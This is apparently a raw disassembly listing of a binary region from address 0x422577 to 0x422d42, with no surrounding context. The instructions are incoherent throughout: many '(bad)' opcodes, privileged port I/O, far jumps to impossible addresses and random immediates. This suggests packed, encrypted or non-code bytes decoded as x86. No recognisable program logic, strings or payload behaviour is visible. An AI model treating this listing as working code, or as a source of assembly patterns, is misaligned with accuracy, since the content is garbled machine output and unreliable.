  422577:	fidiv  DWORD PTR [ebx]
  422579:	jle    0x422586
  42257b:	mov    ecx,0xde5d31d0
  422580:	xchg   esi,eax
  422581:	sbb    bh,bl
  422583:	sbb    al,0x67
  422585:	test   DWORD PTR [edx],ebx
  422587:	lahf   
  422588:	mov    eax,ds:0xce7a2918
  42258d:	popf   
  42258e:	adc    ah,BYTE PTR [ebx-0x48]
  422591:	sbb    DWORD PTR [esi+0x5a],0x92710ed6
  422598:	or     eax,0xe6cae88a
  42259d:	bnd jae 0x42255a
  4225a0:	retf   0xcf87
  4225a3:	xor    dh,BYTE PTR [edx-0x15d448bd]
  4225a9:	in     al,dx
  4225aa:	cmc    
  4225ab:	retf   
  4225ac:	push   esi
  4225ad:	(bad)  
  4225ae:	neg    DWORD PTR [ecx-0x3aa91248]
  4225b4:	pop    ss
  4225b5:	cmp    esp,DWORD PTR [ebp-0x794ce931]
  4225bb:	inc    ebp
  4225bc:	cdq    
  4225bd:	pop    ecx
  4225be:	into   
  4225bf:	or     eax,0xe66f74f7
  4225c4:	dec    ebx
  4225c5:	addr16 cmp eax,0x74a58190
  4225cb:	sar    BYTE PTR [edx+0x3cd57264],0x96
  4225d2:	cmp    al,al
  4225d4:	cmp    al,0x7e
  4225d6:	clc    
  4225d7:	add    ebp,ebp
  4225d9:	xlat   BYTE PTR ds:[ebx]
  4225da:	mov    ch,0x5d
  4225dc:	add    eax,0xff51ccfc
  4225e1:	mov    ch,0xb8
  4225e3:	fistp  WORD PTR [edx+0x3a]
  4225e6:	adc    al,0xb0
  4225e8:	sub    al,0x1a
  4225ea:	ss es xchg ebp,eax
  4225ed:	or     al,bh
  4225ef:	aas    
  4225f0:	es or  eax,0x1ff6b639
  4225f6:	xchg   DWORD PTR [ebx],esp
  4225f8:	mov    ch,BYTE PTR [edx+0x54491690]
  4225fe:	jecxz  0x422605
  422600:	scas   eax,DWORD PTR es:[edi]
  422601:	and    ecx,ebx
  422603:	mov    al,ds:0x539f5031
  422608:	jnp    0x422605
  42260a:	aas    
  42260b:	and    eax,0xa9c46248
  422610:	lahf   
  422611:	call   0x27f39558
  422616:	dec    edx
  422617:	sub    ch,bh
  422619:	mov    cl,BYTE PTR [edi]
  42261b:	stos   BYTE PTR es:[edi],al
  42261c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261d:	sbb    bl,dh
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	in     al,0xab
  422622:	dec    esi
  422623:	outs   dx,DWORD PTR ds:[esi]
  422624:	imul   ecx,DWORD PTR [ebx-0x5926e168],0x313279ab
  42262e:	jg     0x42260a
  422630:	push   edi
  422631:	in     al,dx
  422632:	arpl   WORD PTR [ebx+0x6dca8640],bp
  422638:	aaa    
  422639:	xchg   ebx,eax
  42263a:	mov    DWORD PTR [ebx-0x41],ebx
  42263d:	mov    cl,0x44
  42263f:	dec    edx
  422640:	push   ebp
  422641:	push   esi
  422642:	mov    edi,0x3e96c088
  422647:	in     al,0x91
  422649:	xlat   BYTE PTR ds:[ebx]
  42264a:	mov    ebp,ebx
  42264c:	xor    DWORD PTR [edx-0x50],esi
  42264f:	xor    eax,0x1c714688
  422654:	inc    ebp
  422655:	mov    esi,DWORD PTR [ecx+ecx*4+0x6e]
  422659:	shl    DWORD PTR [edi-0x23],1
  42265c:	loopne 0x4226ce
  42265e:	sub    eax,0x705fed9c
  422663:	jmp    0xd13b13b1
  422668:	push   ebx
  422669:	xor    ch,BYTE PTR [esi]
  42266b:	out    0x4b,eax
  42266d:	sahf   
  42266e:	out    dx,eax
  42266f:	in     eax,dx
  422670:	into   
  422671:	mov    ah,0x6
  422673:	pop    ebp
  422674:	push   ebp
  422675:	or     ebp,esi
  422677:	ins    BYTE PTR es:[edi],dx
  422678:	and    edi,DWORD PTR [ecx]
  42267a:	mov    edi,0x42f01b1a
  42267f:	sbb    dl,al
  422681:	call   0x2c7c7b2a
  422686:	xor    ah,BYTE PTR [bp+si+0x3d]
  42268a:	iret   
  42268b:	outs   dx,DWORD PTR ds:[esi]
  42268c:	mov    ch,BYTE PTR [edi]
  42268e:	xchg   edx,eax
  42268f:	add    al,0xb6
  422691:	jae    0x42267c
  422693:	mov    dl,0xaf
  422695:	mov    ch,0xf
  422697:	xor    eax,0xc11d0d77
  42269c:	adc    eax,0xc8b9a427
  4226a1:	push   0x4a
  4226a3:	dec    ebx
  4226a4:	mov    al,ds:0x579a0af3
  4226a9:	adc    al,0x48
  4226ab:	sub    al,0x87
  4226ad:	mov    ch,0x95
  4226af:	les    edx,FWORD PTR [edi-0x2a]
  4226b2:	(bad)  
  4226b3:	jo     0x4226e9
  4226b5:	sbb    BYTE PTR [edi-0x1a],dl
  4226b8:	cmp    DWORD PTR [edi],edi
  4226ba:	inc    edx
  4226bb:	ins    BYTE PTR es:[edi],dx
  4226bc:	ja     0x422646
  4226be:	hlt    
  4226bf:	lea    esp,cs:[ebx-0xc]
  4226c3:	adc    edi,DWORD PTR [ebx+edi*4-0x4295fcce]
  4226ca:	stos   BYTE PTR es:[edi],al
  4226cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226cc:	xchg   ebx,eax
  4226cd:	xchg   esi,eax
  4226cf:	aas    
  4226d0:	gs and al,bh
  4226d3:	lds    ecx,FWORD PTR [ecx-0x736b6d28]
  4226d9:	jo     0x422746
  4226db:	adc    DWORD PTR [eax],0xd99d042e
  4226e1:	pop    esi
  4226e2:	arpl   WORD PTR [ebp+0x4b],ax
  4226e5:	xchg   edx,eax
  4226e6:	push   ecx
  4226e7:	ja     0x422758
  4226e9:	into   
  4226ea:	out    0xc1,al
  4226ec:	call   0xb4a3c7cf
  4226f1:	add    eax,0x66c49c1
  4226f6:	sub    esi,DWORD PTR [ebp-0x3b7748d1]
  4226fc:	inc    ecx
  4226fd:	mov    esi,0x1e08ecd4
  422702:	xchg   ecx,eax
  422703:	add    al,BYTE PTR [edi-0x6022b2e1]
  422709:	push   ds
  42270a:	cmp    bh,BYTE PTR [edx+ebp*2]
  42270d:	je     0x422715
  42270f:	(bad)  
  422710:	push   ecx
  422711:	mov    ebx,0x2acb6e5
  422716:	mov    ebx,0x67085d7e
  42271b:	aas    
  42271c:	or     ebp,ecx
  42271e:	jo     0x4226d4
  422720:	cmc    
  422721:	sbb    edi,esi
  422723:	xchg   ebp,eax
  422724:	push   esi
  422725:	int    0x5b
  422727:	std    
  422728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422729:	mov    ds:0x3f6a32ae,al
  42272e:	mov    ch,0x79
  422730:	cs adc al,0xb0
  422733:	pop    es
  422734:	pop    eax
  422735:	dec    edx
  422736:	test   DWORD PTR [esi-0x41],ebx
  422739:	out    dx,eax
  42273a:	jb     0x42276c
  42273c:	mov    edi,0x118ad902
  422741:	jp     0x422729
  422743:	(bad)  ds:0x3f4b5d39
  422749:	pusha  
  42274a:	std    
  42274b:	pop    ebp
  42274c:	(bad)  
  42274d:	loopne 0x422700
  42274f:	push   es
  422750:	retf   
  422751:	jns    0x42270e
  422753:	add    ecx,DWORD PTR [edx+eax*1]
  422756:	inc    ebp
  422757:	adc    DWORD PTR [edx+ebp*4],ebp
  42275a:	repz inc edx
  42275c:	add    al,0x10
  42275e:	aad    0x58
  422760:	stos   BYTE PTR es:[edi],al
  422761:	lea    ecx,[ebx+0x143a351f]
  422767:	repz sti 
  422769:	cmc    
  42276a:	(bad)  [esi+esi*1+0x5255f88]
  422771:	fucompp 
  422773:	icebp  
  422774:	mov    WORD PTR ds:0x4ff3178,?
  42277a:	and    BYTE PTR [eax],al
  42277c:	les    ecx,FWORD PTR [ecx-0x3fd69c44]
  422782:	pusha  
  422783:	or     edi,ebp
  422785:	xor    al,0xc1
  422787:	stc    
  422788:	add    DWORD PTR [edi],ebx
  42278a:	sub    eax,0x3762c725
  42278f:	mov    ebp,0xae8923c9
  422794:	mov    ah,0xc1
  422796:	mov    cs,WORD PTR [esi-0x2867d8dc]
  42279c:	mov    ds:0xbad10288,al
  4227a1:	ret    0x2d53
  4227a4:	iret   
  4227a5:	or     eax,0x3e9aea2a
  4227aa:	arpl   WORD PTR [eax],sp
  4227ac:	popf   
  4227ad:	xchg   ebp,eax
  4227ae:	popa   
  4227af:	retf   0xc8d5
  4227b2:	bnd jne 0x422776
  4227b5:	imul   edx,DWORD PTR [eax-0x2d],0xffffffa0
  4227b9:	call   0xa81496c4
  4227be:	jp     0x4227a1
  4227c0:	cmp    dh,dl
  4227c2:	or     eax,0x483dccba
  4227c7:	mov    esi,0x6f092ee
  4227cc:	loop   0x422761
  4227ce:	retf   
  4227cf:	adc    ecx,DWORD PTR [esi]
  4227d1:	popf   
  4227d2:	inc    esp
  4227d3:	ret    0x60eb
  4227d6:	call   0xe1a75cb9
  4227db:	push   ebx
  4227dc:	mov    esi,0xa2421709
  4227e1:	ins    DWORD PTR es:[edi],dx
  4227e2:	push   edi
  4227e3:	dec    esi
  4227e4:	ins    DWORD PTR es:[edi],dx
  4227e5:	in     eax,0xd6
  4227e7:	(bad)  
  4227e9:	xchg   esp,eax
  4227ea:	lods   eax,DWORD PTR ds:[esi]
  4227eb:	ror    BYTE PTR [eax-0x683a48ab],1
  4227f1:	test   ebx,ecx
  4227f3:	mov    ch,0x38
  4227f5:	imul   edi,DWORD PTR [edi],0x15
  4227f8:	fmulp  st(3),st
  4227fa:	mov    esp,0x49b46764
  4227ff:	adc    eax,0x93438e8c
  422804:	outs   dx,BYTE PTR ds:[esi]
  422805:	retf   0x128
  422808:	pop    eax
  422809:	push   ss
  42280a:	test   bh,bl
  42280c:	push   ss
  42280d:	bnd jns 0x422853
  422810:	sub    dh,BYTE PTR [esi+eiz*2-0x4bcb7e3c]
  422817:	push   0x1bde04c4
  42281c:	mov    edi,0x205eb718
  422821:	rcl    DWORD PTR [ebx],1
  422823:	jo     0x4227b3
  422825:	add    eax,0x95443865
  42282a:	in     al,dx
  42282b:	cmp    DWORD PTR [edx-0x22da638e],ebp
  422831:	pushf  
  422832:	cld    
  422833:	or     DWORD PTR [eax+0x7d1f18c4],esp
  422839:	std    
  42283a:	xor    bl,BYTE PTR [eax]
  42283c:	pop    ebp
  42283d:	push   ecx
  42283e:	sar    BYTE PTR [edx+0x21081cf3],0xf7
  422845:	lea    ebp,[esi+esi*1+0x21]
  422849:	das    
  42284a:	sbb    esp,DWORD PTR [edi-0x32]
  42284d:	in     eax,0x44
  42284f:	adc    edi,DWORD PTR [esi*1-0x12a68eb0]
  422856:	jge    0x422893
  422858:	push   ecx
  422859:	popa   
  42285a:	ja     0x42283b
  42285c:	test   edi,esp
  42285e:	(bad)  
  42285f:	ins    DWORD PTR es:[edi],dx
  422860:	popa   
  422861:	ja     0x422869
  422863:	aad    0x47
  422865:	dec    eax
  422866:	and    al,0xb1
  422868:	push   0xd153a82d
  42286d:	shl    dh,cl
  42286f:	sar    BYTE PTR [ebp-0x48],1
  422872:	inc    ebp
  422873:	xchg   edi,eax
  422874:	inc    edi
  422875:	cmp    al,0x81
  422877:	dec    ecx
  422878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422879:	rcr    DWORD PTR [ecx+esi*2-0x24],1
  42287d:	je     0x422864
  42287f:	push   esi
  422880:	jnp    0x4228f7
  422882:	sub    bh,BYTE PTR [edi-0x7e]
  422885:	add    eax,0x4c770fee
  42288a:	sub    DWORD PTR [esi],esi
  42288c:	mov    ds:0x893ebb02,eax
  422891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422892:	jno    0x4228ac
  422894:	and    cl,BYTE PTR [esi-0x38]
  422897:	sahf   
  422898:	xor    DWORD PTR [edx-0x6b],edi
  42289b:	dec    esp
  42289c:	inc    ecx
  42289d:	mov    ds:0xb9a37021,eax
  4228a2:	int    0x6d
  4228a4:	dec    eax
  4228a5:	sbb    DWORD PTR [edx-0x54],edx
  4228a8:	pop    eax
  4228a9:	int    0x94
  4228ab:	pop    esi
  4228ac:	add    BYTE PTR [esi-0x73],0xbf
  4228b0:	and    BYTE PTR [ebp+0x5d],dh
  4228b3:	cmc    
  4228b4:	imul   esi,DWORD PTR [ebx],0x8411cfdb
  4228ba:	inc    esp
  4228bb:	push   esi
  4228bc:	jne    0x422881
  4228be:	xchg   ebx,eax
  4228bf:	dec    esi
  4228c0:	fmul   DWORD PTR [edi+0x39b1690c]
  4228c6:	mov    ebp,0x91b34a60
  4228cb:	ret    
  4228cc:	mov    dh,0x25
  4228ce:	jbe    0x42289a
  4228d0:	aas    
  4228d1:	pop    es
  4228d2:	(bad)  
  4228d3:	(bad)  
  4228d5:	cld    
  4228d6:	fist   WORD PTR [ecx+0x7e3a7b6e]
  4228dc:	sbb    ch,BYTE PTR [edx]
  4228de:	mov    sp,0xe525
  4228e2:	jne    0x4228ee
  4228e4:	das    
  4228e5:	xchg   edi,eax
  4228e6:	int    0xa5
  4228e8:	mov    edx,DWORD PTR [ebp-0x75]
  4228eb:	dec    ebp
  4228ec:	mov    DWORD PTR [eax+0x4e],eax
  4228ef:	cmp    al,0xd5
  4228f1:	test   BYTE PTR [ebx-0x4196f91e],ah
  4228f7:	jbe    0x422879
  4228f9:	sahf   
  4228fa:	push   esi
  4228fb:	xchg   edx,eax
  4228fc:	es test eax,0xfbbd2e51
  422902:	cmp    ebx,esp
  422904:	fdivr  DWORD PTR [ecx]
  422906:	jmp    0xf977:0x7caac151
  42290d:	pop    ss
  42290e:	inc    edx
  42290f:	es xchg ebp,eax
  422911:	pop    ecx
  422912:	push   ss
  422913:	fdivr  DWORD PTR [ebp-0xc5720fd]
  422919:	sbb    esi,eax
  42291b:	or     eax,0xf248e3ea
  422920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422921:	imul   BYTE PTR ss:[eax+0x58]
  422925:	sbb    DWORD PTR [edx+eiz*2],ecx
  422928:	cmp    eax,0xc05282b3
  42292d:	adc    DWORD PTR [ebx-0xb],esi
  422930:	outs   dx,DWORD PTR ds:[esi]
  422931:	pusha  
  422932:	or     bl,BYTE PTR [ecx-0x7c]
  422935:	inc    ebx
  422936:	in     al,0x91
  422938:	mov    ds:0xcda4517d,al
  42293d:	push   cs
  42293e:	push   ebp
  42293f:	xor    BYTE PTR [ebx+0x0],bl
	...
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	sbb    BYTE PTR [ecx],al
  422958:	cmp    al,0x4
  42295a:	(bad)  
  42295b:	mov    bh,0x1
  42295d:	add    BYTE PTR [edi+0x6],bh
  422960:	add    BYTE PTR [eax],al
  422962:	cli    
  422963:	ins    DWORD PTR es:[edi],dx
  422964:	test   eax,0x6f23fa02
  422969:	stos   BYTE PTR es:[edi],al
  42296a:	mov    cl,0x7a
  42296c:	mov    ebx,0x9ece5d30
  422971:	or     BYTE PTR [esi],0x4d
  422974:	fwait
  422975:	dec    edx
  422976:	outs   dx,DWORD PTR gs:[esi]
  422978:	sar    eax,0xdb
  42297b:	sbb    DWORD PTR [ebx-0x5c4dd3f4],ebp
  422981:	data16 jnp 0x422969
  422984:	inc    edi
  422985:	jp     0x42290e
  422987:	aad    0xbf
  422989:	or     al,0xb2
  42298b:	sbb    DWORD PTR [edx+ebx*8],ecx
  42298e:	pop    ss
  42298f:	(bad)
  422993:	xchg   esp,eax
  422994:	js     0x5d91cf9d
  42299a:	sbb    BYTE PTR [ebx],dh
  42299c:	jns    0x42293e
  42299e:	mov    gs,WORD PTR [ecx]
  4229a0:	jbe    0x422960
  4229a2:	mov    al,0x93
  4229a4:	mov    al,0x3a
  4229a6:	imul   edi,DWORD PTR [edx-0xe6f274b],0x31867c5
  4229b0:	sub    edi,DWORD PTR [ebx+0x29]
  4229b3:	pusha  
  4229b4:	push   eax
  4229b5:	popf   
  4229b6:	or     eax,ecx
  4229b8:	test   DWORD PTR [eax-0x71fcffa7],ebx
  4229be:	adc    esp,DWORD PTR [ebx-0x6c]
  4229c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229c2:	test   ebx,edx
  4229c4:	xor    ecx,ecx
  4229c6:	out    dx,al
  4229c7:	test   WORD PTR [esi+edi*1-0x34],cx
  4229cc:	scas   al,BYTE PTR es:[edi]
  4229cd:	mov    esp,0x401e8e2e
  4229d2:	imul   ebp,eax,0x701f7c9e
  4229d8:	cmc    
  4229d9:	sbb    DWORD PTR ds:0xb72c553e,0xa4dd2e
  4229e3:	mov    edx,0x33b7f2b6
  4229e8:	jp     0x422984
  4229ea:	pop    eax
  4229eb:	mov    ds:0x39a46187,eax
  4229f0:	popf   
  4229f1:	pop    es
  4229f2:	fwait
  4229f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229f4:	in     al,0xa2
  4229f6:	arpl   WORD PTR ds:0x56d85bf,ax
  4229fc:	add    eax,DWORD PTR [edi]
  4229fe:	sub    ah,cl
  422a00:	fimul  DWORD PTR [ecx-0x384b5abd]
  422a06:	test   al,0xf0
  422a08:	sbb    esi,DWORD PTR [ebx-0x42036929]
  422a0e:	adc    ebp,DWORD PTR [ecx+0xd]
  422a11:	adc    al,0xa
  422a13:	scas   al,BYTE PTR es:[edi]
  422a14:	mov    edx,0x6b1fa44a
  422a19:	adc    al,0xb2
  422a1b:	sub    DWORD PTR [edx-0x4d3d519c],esp
  422a21:	mov    edx,0x7d1abfeb
  422a26:	sub    dl,BYTE PTR [esi+0x7b]
  422a29:	out    0xfc,eax
  422a2b:	aas    
  422a2c:	mov    al,ds:0xde507ad6
  422a31:	pop    ebp
  422a32:	dec    ebp
  422a33:	jg     0x422a0d
  422a35:	repz jae 0x422a69
  422a38:	(bad)  
  422a39:	xchg   esp,eax
  422a3a:	jb     0x4229be
  422a3c:	xchg   BYTE PTR [edi+0xe925e67],ch
  422a42:	push   eax
  422a43:	or     esi,edx
  422a45:	mov    ch,0x1c
  422a47:	and    ecx,ebx
  422a49:	ss std 
  422a4b:	daa    
  422a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a4d:	out    0xe4,al
  422a4f:	push   edi
  422a50:	push   ecx
  422a51:	in     eax,dx
  422a52:	cmp    eax,0x2719fdca
  422a57:	cmp    eax,0x4d6aa126
  422a5c:	push   ebp
  422a5d:	cli    
  422a5e:	push   esi
  422a5f:	in     eax,dx
  422a60:	shl    DWORD PTR ds:0x42d08c91,0xd0
  422a67:	es out 0x44,al
  422a6a:	mov    ebp,0x767d1f5b
  422a6f:	test   eax,0x337fe081
  422a74:	in     al,dx
  422a75:	jge    0x422a18
  422a77:	out    dx,eax
  422a78:	adc    eax,0x8d0cb999
  422a7d:	nop
  422a7e:	cld    
  422a7f:	test   al,0xe5
  422a81:	std    
  422a82:	jns    0x422ac1
  422a84:	or     BYTE PTR [ebp-0x2d5938e],cl
  422a8a:	mov    ?,WORD PTR [ebp-0x216a5d9a]
  422a90:	and    esp,esi
  422a92:	pop    ds
  422a93:	jne    0x422a29
  422a95:	jge    0x422a80
  422a97:	sbb    eax,DWORD PTR [ecx+0x34c84452]
  422a9d:	xor    al,BYTE PTR [ebx-0xc]
  422aa0:	mov    al,ds:0xc03c2ee0
  422aa5:	ja     0x422acb
  422aa7:	and    DWORD PTR [ebp+0x5b65970a],edi
  422aad:	adc    al,dh
  422aaf:	jp     0x422a4a
  422ab1:	mov    dl,0xbf
  422ab3:	mov    cl,al
  422ab5:	adc    BYTE PTR ss:[ebp-0x6fe6e86a],0xa9
  422abd:	cmc    
  422abe:	or     BYTE PTR [eax+ebx*4+0x62463156],0x45
  422ac6:	lock dec esp
  422ac8:	leave  
  422ac9:	xor    ebp,DWORD PTR [edi]
  422acb:	idiv   DWORD PTR [edi+0x1007536d]
  422ad1:	xchg   edi,eax
  422ad2:	in     eax,dx
  422ad3:	popf   
  422ad4:	cmp    eax,0x3a1ab998
  422ad9:	jb     0x422b40
  422adb:	call   0xad13:0xdc0d2dfe
  422ae2:	adc    eax,0xd2fdb37b
  422ae7:	mov    ecx,0x79dcaf07
  422aec:	pushf  
  422aed:	and    eax,0xf356b593
  422af2:	mov    DWORD PTR [edi-0x40],ebp
  422af5:	(bad)  
  422af7:	lahf   
  422af8:	stos   DWORD PTR es:[edi],eax
  422af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422afa:	or     BYTE PTR [ebp-0x1134105f],0x96
  422b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b02:	cs enter 0x59ec,0x92
  422b07:	lea    edi,[eax+0x21]
  422b0a:	and    ebp,DWORD PTR [ebx-0x42]
  422b0d:	loope  0x422ac4
  422b0f:	je     0x422b56
  422b11:	pop    ebx
  422b12:	xor    eax,ebp
  422b14:	and    esp,ebx
  422b16:	nop
  422b17:	retf   
  422b18:	jnp    0x422b3f
  422b1a:	mov    DWORD PTR [ecx+0x3d],esi
  422b1d:	mov    ch,0xaa
  422b1f:	lock outs dx,BYTE PTR ds:[esi]
  422b21:	mov    eax,0x46bff06e
  422b26:	add    ecx,esp
  422b28:	mov    dl,0xcf
  422b2a:	sbb    al,0x68
  422b2c:	leave  
  422b2d:	inc    esp
  422b2e:	xchg   edx,eax
  422b2f:	das    
  422b30:	int3   
  422b31:	mov    dh,0xf6
  422b33:	sbb    cl,BYTE PTR [ecx+0x6db08c46]
  422b39:	add    edx,DWORD PTR [eax+0x3a8f8acf]
  422b3f:	in     eax,dx
  422b40:	fdiv   QWORD PTR [ecx+0xe61f773]
  422b46:	mov    dh,0xb6
  422b48:	dec    esp
  422b49:	mov    ch,0xe0
  422b4b:	sub    eax,0xb8781f84
  422b50:	cmc    
  422b51:	sti    
  422b52:	sbb    BYTE PTR [esi+0x64],0x15
  422b56:	xchg   edx,eax
  422b57:	xchg   edi,eax
  422b58:	adc    BYTE PTR [esi+0x14],bh
  422b5b:	jnp    0x422ade
  422b5d:	mov    cl,0x38
  422b5f:	in     eax,0x45
  422b61:	push   ds
  422b62:	scas   eax,DWORD PTR es:[edi]
  422b63:	xchg   esp,eax
  422b64:	gs jmp 0xb0e5c0a2
  422b6a:	jnp    0x422ba2
  422b6c:	cmp    ebx,esp
  422b6e:	sbb    al,0x32
  422b70:	or     DWORD PTR [esi+0x4d354dcb],esi
  422b76:	push   eax
  422b77:	xchg   BYTE PTR [edx],bh
  422b79:	sbb    DWORD PTR [ecx+0x24],esi
  422b7c:	or     DWORD PTR [eax+0x12],0x2ddfdfc
  422b83:	scas   al,BYTE PTR es:[edi]
  422b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b85:	cmp    BYTE PTR [ecx-0x4420aca0],dl
  422b8b:	out    0x78,eax
  422b8d:	rol    eax,cl
  422b8f:	test   ecx,eax
  422b91:	js     0x422b53
  422b93:	sbb    al,cl
  422b95:	jle    0x422b7a
  422b97:	push   esi
  422b98:	fdivrp st(0),st
  422b9a:	adc    BYTE PTR [ecx+0x63],ch
  422b9d:	fwait
  422b9e:	xchg   BYTE PTR [ebx+0x5f],bh
  422ba1:	sti    
  422ba2:	mov    ds:0xf7eb6417,eax
  422ba7:	sbb    eax,0x65c26cff
  422bac:	ins    DWORD PTR es:[edi],dx
  422bad:	int    0x78
  422baf:	mul    dl
  422bb1:	mov    al,bl
  422bb3:	cdq    
  422bb4:	add    esi,edi
  422bb6:	aam    0x32
  422bb8:	mov    al,ds:0xceb37950
  422bbd:	push   0x63642fb6
  422bc2:	xor    eax,0x8f6d2999
  422bc7:	ja     0x422c2a
  422bc9:	or     eax,0x37d9619b
  422bce:	mov    bl,0x89
  422bd0:	mov    al,ds:0x1657b9c
  422bd5:	inc    ebp
  422bd6:	dec    eax
  422bd7:	dec    esi
  422bd8:	jbe    0x422bb8
  422bda:	cmp    BYTE PTR [ecx+ecx*1],0x84
  422bde:	mov    esi,0xabdcec7e
  422be3:	sbb    al,0xe4
  422be5:	shr    BYTE PTR [ecx+0x7c854d77],cl
  422beb:	out    dx,eax
  422bec:	mov    DWORD PTR [ecx-0x1af54853],ecx
  422bf2:	and    cl,BYTE PTR [eax-0x207c964e]
  422bf8:	out    0xed,eax
  422bfa:	inc    ebp
  422bfb:	sbb    al,BYTE PTR [ebp-0x139bf8fc]
  422c01:	or     DWORD PTR [esi+0x59],esi
  422c04:	mov    dl,BYTE PTR [ebx-0x3cdbcb3b]
  422c0a:	into   
  422c0b:	ret    0x621c
  422c0e:	push   ebp
  422c0f:	fild   QWORD PTR [edi+0x7179ce09]
  422c15:	adc    BYTE PTR [ebx+0x36d34b57],bl
  422c1b:	test   BYTE PTR [edi+ebp*8-0x79b9333c],0xfa
  422c23:	outs   dx,DWORD PTR ds:[esi]
  422c24:	(bad)  
  422c25:	sar    DWORD PTR [edi+esi*8-0x4945a9ba],1
  422c2c:	std    
  422c2d:	push   cs
  422c2e:	xchg   ebx,eax
  422c2f:	jnp    0x422c76
  422c31:	loop   0x422bc6
  422c33:	sub    DWORD PTR [ebp+0x2f],edx
  422c36:	ret    0x8905
  422c39:	in     eax,dx
  422c3a:	scas   eax,DWORD PTR es:[edi]
  422c3b:	add    BYTE PTR [edx],dl
  422c3d:	jno    0x422c1d
  422c3f:	lods   al,BYTE PTR ds:[esi]
  422c40:	jecxz  0x422c90
  422c42:	dec    eax
  422c43:	fwait
  422c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c45:	mov    dh,0x68
  422c47:	sub    ax,0x9cc1
  422c4b:	mov    edx,DWORD PTR [edx]
  422c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4e:	pop    es
  422c4f:	imul   edi,DWORD PTR [edx-0xaf23271],0x3f
  422c56:	sub    eax,0xfffb6b73
  422c5b:	fwait
  422c5c:	jg     0x422c05
  422c5e:	loope  0x422c92
  422c60:	xchg   DWORD PTR [eax+0x3f],ecx
  422c63:	push   edi
  422c64:	xor    esi,esi
  422c66:	xchg   cl,bh
  422c68:	aad    0x80
  422c6a:	scas   al,BYTE PTR es:[edi]
  422c6b:	mov    eax,ds:0xc90e3613
  422c70:	test   ecx,edi
  422c72:	outs   dx,BYTE PTR ds:[esi]
  422c73:	cdq    
  422c74:	aad    0xc5
  422c76:	jp     0x422caf
  422c78:	add    edi,DWORD PTR [ebp-0x73]
  422c7b:	jmp    0xd758bc34
  422c80:	jmp    0x9705:0x2658a5c8
  422c87:	push   ds
  422c88:	cmp    eax,0x4e93e968
  422c8d:	into   
  422c8e:	xor    esi,DWORD PTR [ecx]
  422c90:	shl    BYTE PTR [edx-0x4743127b],1
  422c96:	add    al,0xc7
  422c98:	inc    ebx
  422c99:	(bad)  
  422c9a:	nop
  422c9b:	cmp    BYTE PTR [edi-0x1b39acf9],dl
  422ca1:	jg     0x422c59
  422ca3:	nop
  422ca4:	xlat   BYTE PTR ds:[ebx]
  422ca5:	pushf  
  422ca6:	sub    al,0xbe
  422ca8:	xor    DWORD PTR [esi*4+0xb9284fa],edx
  422caf:	jp     0x422c39
  422cb1:	xchg   ebp,eax
  422cb2:	fst    QWORD PTR [edx+0x2a]
  422cb5:	mov    ds:0x785c41a2,al
  422cba:	in     al,0xff
  422cbc:	or     al,BYTE PTR [edi+0x6a]
  422cbf:	inc    esp
  422cc0:	jmp    0x422cca
  422cc2:	leave  
  422cc3:	(bad)  
  422cc4:	retf   0x8ccb
  422cc7:	scas   eax,DWORD PTR es:[edi]
  422cc8:	or     al,0xf3
  422cca:	sbb    DWORD PTR [ecx-0x3],0xcafe1253
  422cd1:	mov    cl,0x63
  422cd3:	push   esi
  422cd4:	jbe    0x422cc6
  422cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cd7:	sub    BYTE PTR [edi-0x43],dl
  422cda:	(bad)  
  422cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cdd:	push   esp
  422cde:	pop    eax
  422cdf:	xadd   DWORD PTR [esi-0x53],esp
  422ce3:	mov    bl,0xc6
  422ce5:	das    
  422ce6:	push   eax
  422ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ce8:	add    BYTE PTR [edi],al
  422cea:	loop   0x422cff
  422cec:	les    edx,FWORD PTR [ebp+0x47]
  422cef:	xchg   esi,eax
  422cf0:	pop    edi
  422cf1:	jmp    DWORD PTR [esi+0x63]
  422cf4:	mov    WORD PTR [ecx-0x23],es
  422cf7:	ficom  WORD PTR [ebp+0x5d235788]
  422cfd:	mov    DWORD PTR [eax+eax*2-0x5846ed4e],esp
  422d04:	push   ss
  422d05:	imul   ecx,DWORD PTR [ecx],0xffffffa4
  422d08:	dec    ebx
  422d09:	ins    BYTE PTR es:[edi],dx
  422d0a:	xchg   esi,eax
  422d0b:	mov    ah,BYTE PTR [esi-0x63469721]
  422d11:	fs fcmovnbe st,st(7)
  422d14:	and    eax,0x528ceed1
  422d19:	jbe    0x422d71
  422d1b:	lds    edx,FWORD PTR [esi]
  422d1d:	cmp    eax,0xab34b042
  422d22:	ins    BYTE PTR es:[edi],dx
  422d23:	lods   al,BYTE PTR ds:[esi]
  422d24:	xchg   bh,dl
  422d26:	out    0xd0,eax
  422d28:	mov    edx,0x112d0bac
  422d2d:	inc    edi
  422d2e:	sbb    DWORD PTR [ebx],ebx
  422d30:	mov    dl,0x6a
  422d32:	sub    dl,BYTE PTR [ebx+0xa]
  422d35:	aaa    
  422d36:	jae    0x422d73
  422d38:	ficom  DWORD PTR [edx]
  422d3a:	fs push ss
  422d3c:	mov    ?,WORD PTR [ebp-0x17cef5d0]
  422d42:	(bad)  [edx]
